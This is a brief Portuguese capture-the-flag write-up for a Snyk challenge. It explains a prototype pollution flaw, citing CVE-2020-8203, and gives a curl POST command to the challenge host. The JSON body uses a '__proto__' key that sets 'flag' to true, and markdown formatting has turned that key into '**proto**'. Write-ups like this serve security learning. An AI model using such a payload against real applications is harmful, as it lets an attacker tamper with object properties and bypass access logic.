## Resolução

Resolução desse CTF e bem simples, ele nos mostra como se aproveitar de uma falha
chamada Prototype Pollution https://www.cve.org/CVERecord?id=CVE-2020-8203.

Pra resolver basta fazer uma requisição post com o objeto **proto**

Ex:
curl --location 'http://invisible-ink.c.ctf-snyk.io/echo' \
 --header 'Content-Type: application/json' \
 --data '
{
"**proto**": {
"flag":true
}
}'
